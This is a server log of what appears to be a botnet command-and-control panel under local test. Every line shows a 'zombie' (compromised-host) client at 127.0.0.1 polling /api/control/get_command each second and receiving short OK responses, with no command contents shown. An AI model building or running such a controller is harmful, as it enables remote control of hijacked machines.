2025-06-24 23:29:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:29:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:29:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:29:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:29:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:29:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
